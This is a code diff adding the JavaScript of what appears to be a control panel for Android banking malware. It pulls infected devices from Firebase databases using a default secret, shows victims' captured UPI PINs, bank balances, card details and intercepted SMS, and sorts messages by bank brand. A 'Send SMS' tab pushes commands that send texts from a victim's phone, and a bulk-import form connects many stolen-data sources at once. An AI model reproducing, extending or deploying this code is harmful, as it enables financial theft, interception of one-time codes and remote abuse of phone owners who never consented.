+    + '<svg width="15" height="15" viewBox="0 0 24 24" fill="' + (starred ? 'currentColor' : 'none') + '" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>'
+    + '</button>'
+    + '<button class="sbtn" data-menu="1" title="Hide">'
+    + '<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="1"/><circle cx="12" cy="5" r="1"/><circle cx="12" cy="19" r="1"/></svg>'
+    + '</button>'
+    + '</div>'
+    + '</div>'
+    + '<div class="card-grid">'
+    + '<div class="kv"><div class="k">Android</div><div class="v">' + esc(android) + '</div></div>'
+    + '<div class="kv"><div class="k">Battery</div>'
+    + '<div class="battery" style="color:' + batClr + '">'
+    + '<div class="ico"><div class="fill" style="width:'+bat.p+'%"></div></div>'
+    + '<span>' + esc(bat.l) + '</span>'
+    + '</div></div>'
+    + '<div class="kv"><div class="k">Number</div>' + phoneHtml + '</div>'
+    + '<div class="kv"><div class="k">Network</div>' + netHtml + '</div>'
+    + '</div>'
+    + bankHtml
+    + '<div class="card-foot ' + (on ? 'online' : 'offline') + '">'
+    + '<div class="dot"></div>'
+    + '<span class="lbl">' + (on ? 'Online' : 'Offline') + '</span>'
+    + (hid ? '<span class="right">Hidden</span>' : '')
+    + '</div>'
+    + '</div>';
+}
+
+// ============ RENDER UI ============
+function applyFiltersToList(list){
+  var out = [];
+  for(var i=0;i<list.length;i++){
+    var d = list[i];
+    if(!showHidden && isBL(d)) continue;
+    if(currentFilter === 'online' && !d.status) continue;
+    if(currentFilter === 'offline' && d.status) continue;
+    if(currentFilter === 'upi' && !d.upipin) continue;
+    if(currentFilter === 'bank' && (!d.sms.bankBalances || d.sms.bankBalances.length === 0)) continue;
+    if(currentFilter === 'card' && (!d.sms.cards || d.sms.cards.length === 0)) continue;
+    if(currentFilter === 'starred' && !isStar(d)) continue;
+    if(searchQ){
+      var q = searchQ.toLowerCase();
+      var hit = (d.name && d.name.toLowerCase().indexOf(q) !== -1)
+        || (d.id && d.id.toLowerCase().indexOf(q) !== -1)
+        || (d.mobNo && d.mobNo.indexOf(q) !== -1)
+        || (d._srcTag && d._srcTag.toLowerCase().indexOf(q) !== -1);
+      if(!hit) continue;
+    }
+    out.push(d);
+  }
+  if(currentSort === 'newest') out.sort(function(a,b){return (b.id||'').localeCompare(a.id||'');});
+  else if(currentSort === 'oldest') out.sort(function(a,b){return (a.id||'').localeCompare(b.id||'');});
+  else if(currentSort === 'name') out.sort(function(a,b){return (a.name||'').localeCompare(b.name||'');});
+  else if(currentSort === 'battery') out.sort(function(a,b){return parseBat(b.battery).p - parseBat(a.battery).p;});
+  return out;
+}
+
+function renderBrandChips(){
+  if(!$brandScroll) return;
+  var html = '';
+  for(var i=0;i<BRANDS.length;i++){
+    var b = BRANDS[i];
+    html += '<button class="h-brand-chip ' + (activeBrand === b.key ? 'active' : '') + '" data-brand="' + b.key + '">'
+      + '<span class="dot"></span>' + esc(b.label)
+      + '</button>';
+  }
+  $brandScroll.innerHTML = html;
+}
+
+function renderSections(){
+  renderBrandChips();
+  if(!devices || devices.length === 0){
+    $sectionsRoot.innerHTML = '<div class="empty"><div class="t">No devices available</div><div class="s">Add a source to get started</div></div>';
+    return;
+  }
+  
+  var filtered = applyFiltersToList(devices);
+  var html = '';
+
+  for(var bi=0;bi<BRANDS.length;bi++){
+    var brand = BRANDS[bi];
+    var isActive = (activeBrand === brand.key);
+    var usedList = [], unusedList = [];
+    
+    for(var i=0;i<filtered.length;i++){
+      var d = filtered[i];
+      var bc = brandCache[dkey(d)];
+      if(bc && bc[brand.key]) usedList.push(d);
+      else unusedList.push(d);
+    }
+    var allList = usedList.concat(unusedList);
+
+    html += '<div class="brand-section ' + brand.cls + ' ' + (isActive ? 'active' : '') + '">'
+      + '<div class="brand-head">'
+      + '<div class="brand-icon-box">' + esc(brand.short) + '</div>'
+      + '<div class="brand-title">'
+      + '<div class="bt">' + esc(brand.label) + '</div>'
+      + '<div class="bs">' + allList.length + ' devices</div>'
+      + '</div>'
+      + '<div class="brand-counts">'
+      + '<div class="brand-count used"><span class="cd"></span>USED ' + usedList.length + '</div>'
+      + '<div class="brand-count unused"><span class="cd"></span>UNUSED ' + unusedList.length + '</div>'
+      + '</div>'
+      + '</div>';
+
+    html += '<div class="brand-body">';
+    if(allList.length === 0){
+      html += '<div class="brand-empty">No devices match</div>';
+    } else {
+      html += '<div class="grid">';
+      for(var k=0;k<allList.length;k++) html += renderCard(allList[k], brand);
+      html += '</div>';
+    }
+    html += '</div>';
+    html += '</div>';
+  }
+  $sectionsRoot.innerHTML = html;
+}
+
+// ============ STATS ============
+function updateStats(){
+  var vis = 0, on = 0, off = 0, bk = 0;
+  for(var i=0;i<devices.length;i++){
+    var d = devices[i];
+    if(isBL(d)) continue;
+    vis++;
+    if(d.status) on++; else off++;
+    if((d.sms.bankBalances || []).length > 0) bk++;
+  }
+  var sig = vis+':'+on+':'+off+':'+bk;
+  if(sig === lastStatsSig) return;
+  lastStatsSig = sig;
+  document.getElementById('sTotal').textContent = vis;
+  document.getElementById('sOnline').textContent = on;
+  document.getElementById('sOffline').textContent = off;
+  document.getElementById('sBank').textContent = bk;
+}
+
+// ============ UPDATE CARD IN DOM ============
+function updateCardInDom(dev){
+  var cards = $sectionsRoot.querySelectorAll('.card');
+  for(var i=0;i<cards.length;i++){
+    var c = cards[i];
+    if(c.getAttribute('data-id') !== dev.id) continue;
+    if(c.getAttribute('data-src') !== dev._srcUrl) continue;
+    var cells = c.querySelectorAll('.card-grid .kv');
+    if(cells.length < 4) return;
+    var phone = dev.mobNo && dev.mobNo !== '—' ? dev.mobNo : null;
+    var phoneEl = cells[2].querySelector('.v');
+    if(phoneEl){
+      var ph = phone ? phone : '—';
+      if(phoneEl.textContent !== ph){
+        phoneEl.textContent = ph;
+        phoneEl.className = phone ? 'v mono' : 'v muted';
+      }
+    }
+    var nets = (dev.sms && dev.sms.networks) || [];
+    var net = dev.network || (nets.length > 0 ? nets[0] : null);
+    var netEl = cells[3].querySelector('.v');
+    if(netEl){
+      var nn = net ? net : '—';
+      if(netEl.textContent !== nn){
+        netEl.textContent = nn;
+        netEl.className = net ? 'v' : 'v muted';
+      }
+    }
+    return;
+  }
+}
+
+// ============ FETCH DEVICES ============
+async function fetchAll(silent){
+  if(fetchInProgress) return;
+  if(sources.length === 0){
+    $sectionsRoot.innerHTML = '<div class="empty"><div class="t">No sources connected</div><div class="s">Open Settings to add your first Firebase source</div></div>';
+    return;
+  }
+  fetchInProgress = true;
+  if(!silent && devices.length === 0){
+    $sectionsRoot.innerHTML = '<div class="empty"><div class="spinner"></div><div class="t">Loading devices…</div></div>';
+  }
+  var all = [];
+  var bs = 20;
+  for(var i=0;i<sources.length;i+=bs){
+    var batch = sources.slice(i, i+bs);
+    var promises = batch.map(function(src){
+      var url = src.url + '/clients.json?auth=' + encodeURIComponent(src.secret);
+      return fetch(url)
+        .then(function(r){
+          if(!r.ok) throw new Error('HTTP ' + r.status);
+          return r.json().then(function(d){ return {src:src, data:d}; });
+        })
+        .catch(function(e){ return {src:src, error:e.message}; });
+    });
+    var settled = await Promise.allSettled(promises);
+    for(var s=0;s<settled.length;s++){
+      if(settled[s].status !== 'fulfilled') continue;
+      var v = settled[s].value;
+      if(v.error || !v.data || typeof v.data !== 'object') continue;
+      var entries = Object.entries(v.data);
+      for(var e=0;e<entries.length;e++){
+        var id = entries[e][0], dev = entries[e][1];
+        if(typeof dev !== 'object' || dev === null) continue;
+        var sims = dev.sims || [];
+        var nodePhone = extractPhoneFromNode(dev, sims);
+        var nodeNetwork = extractNetworkFromNode(dev, sims);
+        all.push({
+          id: id,
+          _srcId: v.src.id, _srcUrl: v.src.url, _srcSec: v.src.secret, _srcTag: v.src.tag,
+          name: dev.modelName || dev.model || dev.deviceName || dev.name || id,
+          androidV: dev.androidV || dev.androidVersion || dev.sdkV || '—',
+          battery: dev.battery || dev.batteryLevel || dev.battery_percent || '—',
+          status: dev.status === true || dev.status === 'true' || dev.status === 1 || dev.status === 'online',
+          mobNo: nodePhone || '—',
+          network: nodeNetwork || null,
+          sims: sims,
+          sms: dev.smsAnalysis || dev.analysis || {},
+          lastSeen: dev.lastSeen || dev.last_seen || dev.timestamp || dev.updatedAt || dev.updated_at || null,
+          upipin: dev.upipin || null,
+          ip: dev.ip_address || dev.ip || '—',
+          storage: dev.storage || '—',
+          cpu: dev.cpu_arch || '—',
+          sdk: dev.sdkV || '—'
+        });
+      }
+    }
+  }
+  for(var c=0;c<all.length;c++){
+    var d = all[c];
+    var k = cacheKey(d);
+    var cached = phoneCache[k];
+    if(cached){
+      if(cached.phone && (!d.mobNo || d.mobNo === '—')) d.mobNo = cached.phone;
+      if(cached.network && !d.network) d.network = cached.network;
+    }
+  }
+  devices = all;
+  updateStats();
+  renderSections();
+  updateAllSmsBadge();
+  updateStarredBadge();
+
+  if(selectedDevice){
+    var still = devices.some(function(x){ return x.id === selectedDevice.id && x._srcUrl === selectedDevice._srcUrl; });
+    if(still){
+      selectedDevice = devices.find(function(x){ return x.id === selectedDevice.id && x._srcUrl === selectedDevice._srcUrl; });
+    } else {
+      closeDetail();
+    }
+  }
+  fetchInProgress = false;
+  enrichBackground();
+}
+
+// ============ FAST ENRICHMENT ============
+var enrichAbort = null;
+async function enrichBackground(){
+  if(enrichRunning) return;
+  enrichRunning = true;
+
+  var toDo = [];
+  for(var i=0;i<devices.length;i++){
+    var d = devices[i];
+    var k = cacheKey(d);
+    var needBrand = brandCache[dkey(d)] === undefined;
+    var needPhone = !phoneCache[k];
+    if(!needBrand && !needPhone) continue;
+    if(!d._srcUrl || !d._srcSec) continue;
+    toDo.push(d);
+  }
+  if(toDo.length === 0){ savePhoneCache(); saveBrandCache(); enrichRunning = false; return; }
+
+  markFetchingCards(toDo);
+
+  enrichAbort = new AbortController();
+  var signal = enrichAbort.signal;
+
+  var CONC = 12;
+  var idx = 0;
+  var running = 0;
+
+  await new Promise(function(resolve){
+    var done = false;
+    function tryFinish(){
+      if(done) return;
+      if(idx >= toDo.length && running === 0){ done = true; resolve(); }
+    }
+    function launch(){
+      if(signal.aborted){ tryFinish(); return; }
+      while(running < CONC && idx < toDo.length){
+        var dev = toDo[idx++];
+        running++;
+        processOne(dev);
+      }
+      tryFinish();
+    }
+    function processOne(dev){
+      fetchSmsRaw(dev.id, dev._srcUrl, dev._srcSec, signal)
+        .then(function(msgs){
+          var phone = null, network = null;
+          if(msgs && msgs.length > 0){
+            for(var i=0;i<msgs.length && !phone;i++){
+              var p = extractPhoneFromSmsText(msgs[i].text);
+              if(p) phone = p;
+            }
+            for(var j=0;j<msgs.length && !network;j++){
+              var nm = msgs[j].text.match(/Jio|Airtel|Vodafone|Idea|BSNL|Vi\b/);
+              if(nm) network = nm[0];
+            }
+          }
+          var entry = phoneCache[cacheKey(dev)];
+          if(!entry){
+            entry = {phone:phone, network:network};
+            if(!phone && !network) entry.empty = true;
+            phoneCache[cacheKey(dev)] = entry;
+          }
+          if(phone) dev.mobNo = phone;
+          if(network) dev.network = network;
+
+          brandCache[dkey(dev)] = matchBrands(msgs);
+          updateCardInDom(dev);
+        })
+        .catch(function(e){ if(e && e.name === 'AbortError') return; })
+        .then(function(){
+          running--;
+          if((toDo.length - idx) % 12 === 0){
+            savePhoneCache();
+            saveBrandCache();
+            setTimeout(launch, 0);
+          } else {
+            launch();
+          }
+        });
+    }
+    launch();
+  });
+
+  savePhoneCache();
+  saveBrandCache();
+  enrichRunning = false;
+  enrichAbort = null;
+  renderSections();
+}
+
+function markFetchingCards(list){
+  var cards = $sectionsRoot.querySelectorAll('.card');
+  if(!cards.length) return;
+  var map = {};
+  for(var i=0;i<list.length;i++) map[list[i].id + '::' + list[i]._srcUrl] = true;
+  for(var j=0;j<cards.length;j++){
+    var c = cards[j];
+    var key = c.getAttribute('data-id') + '::' + c.getAttribute('data-src');
+    if(!map[key]) continue;
+    var cells = c.querySelectorAll('.card-grid .kv');
+    if(cells.length < 4) continue;
+    var phoneEl = cells[2].querySelector('.v');
+    if(phoneEl && phoneEl.textContent === '—'){
+      phoneEl.textContent = 'Fetching…';
+      phoneEl.className = 'v fetching';
+    }
+  }
+}
+
+// ============ BADGES ============
+function updateAllSmsBadge(){
+  var total = 0;
+  for(var k in allSmsCache){
+    if(allSmsCache[k] && allSmsCache[k].length) total += allSmsCache[k].length;
+  }
+  var b = document.getElementById('allSmsBadge');
+  if(total > 0){ b.textContent = total; b.style.display = 'inline-block'; }
+  else b.style.display = 'none';
+}
+function updateStarredBadge(){
+  var count = 0;
+  for(var i=0;i<devices.length;i++) if(isStar(devices[i])) count++;
+  var b = document.getElementById('starredBadge');
+  if(count > 0){ b.textContent = count; b.style.display = 'inline-block'; }
+  else b.style.display = 'none';
+}
+
+// ============ CARD CLICK ============
+function setupGridClick(){
+  $sectionsRoot.onclick = function(e){
+    var card = e.target.closest('.card');
+    if(!card) return;
+    var id = card.getAttribute('data-id');
+    var src = card.getAttribute('data-src');
+    var dev = null;
+    for(var i=0;i<devices.length;i++){
+      if(devices[i].id === id && devices[i]._srcUrl === src){ dev = devices[i]; break; }
+    }
+    if(!dev) return;
+    if(e.target.closest('[data-star]')){
+      e.stopPropagation();
+      toggleStar(dev);
+      renderSections();
+      updateStarredBadge();
+      return;
+    }
+    if(e.target.closest('[data-menu]')){
+      e.stopPropagation();
+      var hid = isBL(dev);
+      confirmBox({name:dev.name, restore:hid}, function(){
+        if(hid){ rmBL(dev); toast('Device restored', 'ok'); }
+        else { addBL(dev); toast('Device hidden', 'warn'); }
+        lastStatsSig = '';
+        renderSections();
+        updateStarredBadge();
+      });
+      return;
+    }
+    openDetail(dev);
+  };
+}
+
+// ============ CONFIRM ============
+function confirmBox(opts, cb){
+  var isR = opts.restore;
+  $confirmRoot.innerHTML = '<div class="modal-overlay" id="cOv"><div class="confirm-box">'
+    + '<div class="title">' + (isR ? 'Restore Device' : 'Hide Device') + '</div>'
+    + '<div class="desc">' + (isR ? 'This device will be visible in the list again.' : 'This device will be hidden from the main list.') + '<br><b>' + esc(opts.name || '') + '</b></div>'
+    + '<div class="confirm-actions"><button class="cancel" id="cNo">Cancel</button>'
+    + '<button class="ok' + (isR ? ' restore' : '') + '" id="cYes">' + (isR ? 'Restore' : 'Hide') + '</button></div>'
+    + '</div></div>';
+  document.getElementById('cNo').onclick = function(){ $confirmRoot.innerHTML = ''; };
+  document.getElementById('cYes').onclick = function(){ $confirmRoot.innerHTML = ''; cb(); };
+  document.getElementById('cOv').onclick = function(e){ if(e.target === this) $confirmRoot.innerHTML = ''; };
+}
+
+// ============ DETAIL PANEL ============
+function openDetail(dev){
+  selectedDevice = dev;
+  detailTab = 'info';
+  smsMsgs = [];
+  smsData = {bankBalances:[], cards:[], phoneNumbers:[], networks:[]};
+  renderDetailShell();
+  if(dev._srcUrl){
+    fetchSms(dev.id, dev._srcUrl, dev._srcSec).then(function(){
+      var entry = {phone:null, network:null};
+      if(smsData.phoneNumbers.length > 0){
+        entry.phone = smsData.phoneNumbers[0];
+        if(!dev.mobNo || dev.mobNo === '—') dev.mobNo = entry.phone;
+      }
+      if(smsData.networks.length > 0){
+        entry.network = smsData.networks[0];
+        if(!dev.network) dev.network = entry.network;
+      }
+      if(entry.phone || entry.network){
+        phoneCache[cacheKey(dev)] = entry;
+        savePhoneCache();
+      }
+      brandCache[dkey(dev)] = matchBrands(smsMsgs);
+      saveBrandCache();
+      if(smsMsgs.length > 0){
+        allSmsCache[dkey(dev)] = smsMsgs;
+        saveAllSmsCache();
+        updateAllSmsBadge();
+      }
+      renderDetailContent();
+    });
+  }
+  if(detailSmsInt) clearInterval(detailSmsInt);
+  detailSmsInt = setInterval(function(){
+    if(document.hidden) return;
+    if(!selectedDevice || !selectedDevice._srcUrl) return;
+    if(detailTab === 'send') return;
+    fetchSms(selectedDevice.id, selectedDevice._srcUrl, selectedDevice._srcSec).then(function(){
+      brandCache[dkey(selectedDevice)] = matchBrands(smsMsgs);
+      saveBrandCache();
+      if(smsMsgs.length > 0){
+        allSmsCache[dkey(selectedDevice)] = smsMsgs;
+        saveAllSmsCache();
+        updateAllSmsBadge();
+      }
+      renderDetailContent();
+    });
+  }, 1000);
+}
+async function fetchSms(id, url, sec){
+  if(!url || !sec) return;
+  smsMsgs = await fetchSmsRaw(id, url, sec);
+  smsData = analyzeSms(smsMsgs);
+}
+function renderDetailShell(){
+  var d = selectedDevice;
+  if(!d) return;
+  var bat = parseBat(d.battery);
+  var on = d.status;
+  $detailRoot.innerHTML = '<div class="d-overlay" id="dOv"><div class="d-panel">'
+    + '<div class="d-head">'
+    + '<div class="info">'
+    + '<div class="name">' + esc(d.name) + '</div>'
+    + '<div class="meta"><div class="dot ' + (on ? 'on' : '') + '"></div>'
+    + '<span>' + (on ? 'Online' : 'Offline') + '</span>'
+    + '<span>·</span><span>' + esc(bat.l) + '</span></div>'
+    + '</div>'
+    + '<button class="close" id="dClose">'
+    + '<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>'
+    + '</button>'
+    + '</div>'
+    + '<div class="d-tabs" id="dTabs">'
+    + '<button data-t="info" class="active">Info</button>'
+    + '<button data-t="bank">Bank (0)</button>'
+    + '<button data-t="sms">Messages (0)</button>'
+    + '<button data-t="send">Send SMS</button>'
+    + '</div>'
+    + '<div class="d-content" id="dContent"></div>'
+    + '</div></div>';
+  document.getElementById('dClose').onclick = closeDetail;
+  document.getElementById('dOv').onclick = function(e){ if(e.target === this) closeDetail(); };
+  document.getElementById('dTabs').onclick = function(e){
+    var b = e.target.closest('button');
+    if(!b) return;
+    var t = b.getAttribute('data-t');
+    if(t === detailTab) return;
+    detailTab = t;
+    var all = this.querySelectorAll('button');
+    for(var i=0;i<all.length;i++) all[i].classList.remove('active');
+    b.classList.add('active');
+    renderDetailContent();
+  };
+  renderDetailContent();
+}
+function renderDetailContent(){
+  var d = selectedDevice;
+  if(!d) return;
+  var $c = document.getElementById('dContent');
+  if(!$c) return;
+  var bat = parseBat(d.battery);
+  var bank = smsData.bankBalances.length > 0 ? smsData.bankBalances : (d.sms.bankBalances || []);
+  var cards = smsData.cards.length > 0 ? smsData.cards : (d.sms.cards || []);
+  var phones = smsData.phoneNumbers.length > 0 ? smsData.phoneNumbers : (d.sms.phoneNumbers || []);
+  var nets = smsData.networks.length > 0 ? smsData.networks : (d.sms.networks || []);
+  var phone = d.mobNo && d.mobNo !== '—' ? d.mobNo : (phones[0] || '—');
+  var ls = d.lastSeen ? fmtTime(d.lastSeen) : '';
+
+  var tabs = document.querySelectorAll('#dTabs button');
+  if(tabs.length === 4){
+    tabs[1].textContent = 'Bank (' + bank.length + ')';
+    tabs[2].textContent = 'Messages (' + smsMsgs.length + ')';
+  }
+
+  var brandMatches = brandCache[dkey(d)] || {};
+
+  var html = '';
+  if(detailTab === 'info'){
+    html = '<div class="section">Brand Match</div>';
+    for(var bi=0;bi<BRANDS.length;bi++){
+      var brand = BRANDS[bi];
+      var isUsed = !!brandMatches[brand.key];
+      html += '<div class="irow"><span class="l">' + esc(brand.label) + '</span><span class="v ' + (isUsed ? 'used' : 'unused') + '">' + (isUsed ? 'USED' : 'UNUSED') + '</span></div>';
+    }
+    html += '<div class="section">Device Information</div>'
+      + '<div class="irow"><span class="l">Phone Number</span><span class="v mono hi">' + esc(phone) + '</span></div>'
+      + '<div class="irow"><span class="l">Network</span><span class="v">' + (nets.length > 0 ? esc(nets.join(', ')) : (d.network ? esc(d.network) : '—')) + '</span></div>'
+      + '<div class="irow"><span class="l">Android Version</span><span class="v">' + esc(d.androidV) + '</span></div>'
+      + '<div class="irow"><span class="l">Battery</span><span class="v">' + esc(bat.l) + '</span></div>'
+      + '<div class="irow"><span class="l">IP Address</span><span class="v mono">' + esc(d.ip) + '</span></div>'
+      + '<div class="irow"><span class="l">Storage</span><span class="v">' + esc(d.storage) + '</span></div>'
+      + '<div class="irow"><span class="l">CPU</span><span class="v mono">' + esc(d.cpu) + '</span></div>'
+      + '<div class="irow"><span class="l">SDK</span><span class="v">' + esc(d.sdk) + '</span></div>'
+      + '<div class="irow"><span class="l">SIM Count</span><span class="v">' + (d.sims || []).length + '</span></div>'
+      + (d.upipin ? '<div class="irow"><span class="l">UPI PIN</span><span class="v hi">' + esc(d.upipin) + '</span></div>' : '')
+      + (ls ? '<div class="irow"><span class="l">Last Seen</span><span class="v">' + esc(ls) + '</span></div>' : '')
+      + (d._srcTag ? '<div class="irow"><span class="l">Source</span><span class="v" style="font-size:12px;color:var(--gold-2)">' + esc(d._srcTag) + '</span></div>' : '')
+      + '<div class="irow"><span class="l">Device ID</span><span class="v mono" style="font-size:11px">' + esc(d.id) + '</span></div>';
+    if(phones.length > 0){
+      html += '<div class="section">Extracted Numbers</div>';
+      phones.slice(0,5).forEach(function(n,i){
+        html += '<div class="irow"><span class="l">Number ' + (i+1) + '</span><span class="v mono hi">' + esc(n) + '</span></div>';
+      });
+    }
+  } else if(detailTab === 'bank'){
+    if(bank.length === 0){
+      html = '<div class="empty"><div class="t">No bank messages</div><div class="s">No bank-related SMS detected on this device</div></div>';
+    } else {
+      bank.forEach(function(b){
+        html += '<div class="bank-item">'
+          + '<div class="row1"><span class="nm">' + esc(b.bankName || 'Bank') + '</span><span class="amt">₹' + esc(b.availableBalance || '0') + '</span></div>'
+          + (b.rawSms ? '<div class="raw">' + esc(b.rawSms) + '</div>' : '')
+          + '</div>';
+      });
+    }
+  } else if(detailTab === 'sms'){
+    if(smsMsgs.length === 0){
+      html = '<div class="empty"><div class="t">No messages</div><div class="s">No SMS retrieved from this device</div></div>';
+    } else {
+      smsMsgs.forEach(function(m){
+        var tags = [];
+        for(var bi2=0;bi2<BRANDS.length;bi2++){
+          if(BRANDS[bi2].regex.test(m.text || '')) tags.push(BRANDS[bi2].label);
+        }
+        var cls = tags.length > 0 ? 'sms-item brand-match' : 'sms-item';
+        html += '<div class="' + cls + '">'
+          + '<div class="head"><span>' + esc(m.sender || 'Unknown') + (tags.length>0 ? ' ['+tags.join(',')+']' : '') + '</span><span class="time">' + esc(m.time || '') + '</span></div>'
+          + '<div class="body">' + esc(m.text) + '</div>'
+          + '</div>';
+      });
+    }
+  } else if(detailTab === 'send'){
+    html = '<div class="form">'
+      + '<div class="lbl">Select SIM</div>'
+      + '<div class="sim-row">'
+      + '<button data-sim="1" class="' + (simSel === 1 ? 'active' : '') + '">SIM 1</button>'
+      + '<button data-sim="2" class="' + (simSel === 2 ? 'active' : '') + '">SIM 2</button>'
+      + '</div>'
+      + '<div class="lbl">Recipient Number</div>'
+      + '<input type="text" id="sNum" placeholder="+91XXXXXXXXXX" value="' + esc(phone !== '—' ? phone : '') + '" />'
+      + '<div class="lbl">Message</div>'
+      + '<textarea id="sMsg" placeholder="Type your message…"></textarea>'
+      + '<button class="btn-primary" id="sSend">Send Message</button>'
+      + '</div>';
+  }
+  $c.innerHTML = html;
+  if(detailTab === 'send'){
+    var simsBox = $c.querySelector('.sim-row');
+    if(simsBox){
+      simsBox.onclick = function(e){
+        var b = e.target.closest('button');
+        if(!b) return;
+        simSel = parseInt(b.getAttribute('data-sim'));
+        var all = simsBox.querySelectorAll('button');
+        for(var i=0;i<all.length;i++) all[i].classList.remove('active');
+        b.classList.add('active');
+      };
+    }
+    var sBtn = document.getElementById('sSend');
+    if(sBtn) sBtn.onclick = sendSms;
+  }
+}
+function closeDetail(){
+  if(detailSmsInt){ clearInterval(detailSmsInt); detailSmsInt = null; }
+  $detailRoot.innerHTML = '';
+  selectedDevice = null;
+}
+async function sendSms(){
+  if(!selectedDevice || !selectedDevice._srcUrl) return;
+  var num = (document.getElementById('sNum')||{}).value || '';
+  var msg = (document.getElementById('sMsg')||{}).value || '';
+  num = num.trim(); msg = msg.trim();
+  if(!num || !msg){ toast('Enter recipient and message', 'err'); return; }
+  var b = document.getElementById('sSend');
+  b.disabled = true; b.textContent = 'Sending…';
+  try{
+    var url = selectedDevice._srcUrl + '/clients/' + selectedDevice.id + '/webhookEvent/sendSms.json?auth=' + encodeURIComponent(selectedDevice._srcSec);
+    var r = await fetch(url, {
+      method:'PUT',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({from:simSel, to:num, message:msg, isSended:false})
+    });
+    if(!r.ok) throw new Error('Request failed');
+    toast('Message queued', 'ok');
+    document.getElementById('sMsg').value = '';
+  }catch(e){ toast('Error: ' + e.message, 'err'); }
+  finally{ b.disabled = false; b.textContent = 'Send Message'; }
+}
+
+// ============ SOURCES MODAL ============
+function openSourcesModal(){
+  var items = sources.map(function(s,i){
+    var st = s.status === 'ok' ? 'ok' : s.status === 'fail' ? 'fail' : '';
+    return '<div class="src-item"><div class="top">'
+      + '<span class="status ' + st + '"></span>'
+      + '<div class="info">'
+      + '<div class="url">' + esc(s.url) + '</div>'
+      + '<div class="meta">' + esc(s.id) + ' · ' + esc(s.tag) + '</div>'
+      + '<input class="note-input" data-id="' + esc(s.id) + '" placeholder="Add a note…" value="' + esc(s.notes || '') + '" />'
+      + '</div>'
+      + '<button class="remove" data-rm="' + i + '">Remove</button>'
+      + '</div></div>';
+  }).join('');
+
+  $modalRoot.innerHTML = '<div class="modal-overlay" id="mOv"><div class="modal">'
+    + '<div class="modal-head"><h2>Firebase Sources</h2>'
+    + '<button class="close" id="mClose">'
+    + '<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>'
+    + '</button></div>'
+    + (items || '<div class="empty" style="padding:20px 0"><div class="t">No sources connected</div></div>')
+    + '<div class="form-group">'
+    + '<h3>Add New Source</h3>'
+    + '<input id="iUrl" placeholder="https://your-project.firebaseio.com" />'
+    + '<input id="iSec" placeholder="Secret key (default: rolex)" />'
+    + '<input id="iNote" placeholder="Label or note (optional)" />'
+    + '<button class="btn-block" id="bAdd">Connect Source</button>'
+    + '</div>'
+    + '<div class="form-group">'
+    + '<h3>Bulk Import</h3>'
+    + '<textarea id="iBulk" placeholder="https://url1.firebaseio.com&#10;https://url2.firebaseio.com"></textarea>'
+    + '<input id="iBulkSec" placeholder="Common secret key (default: rolex)" />'
+    + '<button class="btn-block" id="bBulk">Connect All</button>'
+    + '</div>'
+    + '</div></div>';
+
+  document.getElementById('mClose').onclick = closeModal;
+  document.getElementById('mOv').onclick = function(e){ if(e.target === this) closeModal(); };
+
+  $modalRoot.querySelectorAll('.note-input').forEach(function(inp){
+    inp.onchange = function(){
+      var id = this.getAttribute('data-id');
+      for(var i=0;i<sources.length;i++){
+        if(sources[i].id === id){ sources[i].notes = this.value.trim(); break; }
+      }
+      saveSrc(); toast('Note saved', 'ok');
+    };
+  });
+  $modalRoot.querySelectorAll('[data-rm]').forEach(function(b){
+    b.onclick = function(){
+      var i = parseInt(this.getAttribute('data-rm'));
+      var rem = sources[i];
+      sources.splice(i, 1);
+      saveSrc();
+      blacklist = blacklist.filter(function(k){ return k.indexOf('::' + rem.url) === -1; });
+      saveBL();
+      if(sources.length === 0){ clearSrc(); closeModal(); fetchAll(false); return; }
+      openSourcesModal();
+      fetchAll(true);
+    };
+  });
+  document.getElementById('bAdd').onclick = async function(){
+    var url = normUrl(document.getElementById('iUrl').value);
+    var sec = document.getElementById('iSec').value.trim() || NODE_SECRET;
+    var note = document.getElementById('iNote').value.trim();
+    if(!url){ toast('Please enter a URL', 'err'); return; }
+    this.disabled = true; this.textContent = 'Testing connection…';
+    var res = await testSrc({id:genId(), url:url, secret:sec, tag:makeTag(url), notes:note});
+    if(res.status === 'ok'){
+      sources.push({id:res.id, url:res.url, secret:res.secret, tag:res.tag, notes:res.notes, status:'ok'});
+      saveSrc();
+      toast('Source connected', 'ok');
+      openSourcesModal();
+      fetchAll(true);
+    } else {
+      toast('Connection failed: ' + (res.error || 'unknown'), 'err');
+      this.disabled = false; this.textContent = 'Connect Source';
+    }
+  };
+  document.getElementById('bBulk').onclick = async function(){
+    var lines = document.getElementById('iBulk').value.split('\n').map(function(l){ return l.trim(); }).filter(Boolean);
+    var sec = document.getElementById('iBulkSec').value.trim() || NODE_SECRET;
+    if(lines.length === 0){ toast('Paste at least one URL', 'err'); return; }
+    this.disabled = true;
+    this.textContent = 'Connecting ' + lines.length + ' source(s)…';
+    var ok = 0;
+    for(var i=0;i<lines.length;i+=12){
+      var batch = lines.slice(i, i+12);
+      var promises = batch.map(async function(l){
+        var u = normUrl(l);
+        if(!u) return null;
+        return await testSrc({id:genId(), url:u, secret:sec, tag:makeTag(u), notes:''});
+      });
+      var results = await Promise.all(promises);
+      results.forEach(function(r){
+        if(r && r.status === 'ok'){
+          sources.push({id:r.id, url:r.url, secret:r.secret, tag:r.tag, notes:r.notes, status:'ok'});
+          ok++;
+        }
+      });
+    }
+    saveSrc();
+    toast(ok + ' source(s) connected', 'ok');
+    openSourcesModal();
+    fetchAll(true);
+  };
+}
+function closeModal(){
+  stopSmsLive();
+  abortSmsFetch();
+  if(smsScrollHandler && smsListEl){ smsListEl.removeEventListener('scroll', smsScrollHandler); smsScrollHandler = null; smsListEl = null; }
+  smsFilteredList = [];
+  smsRenderedCount = 0;
+  $modalRoot.innerHTML = '';
+}
+async function testSrc(s){
+  try{
+    var r = await fetch(s.url + '/clients.json?auth=' + encodeURIComponent(s.secret));
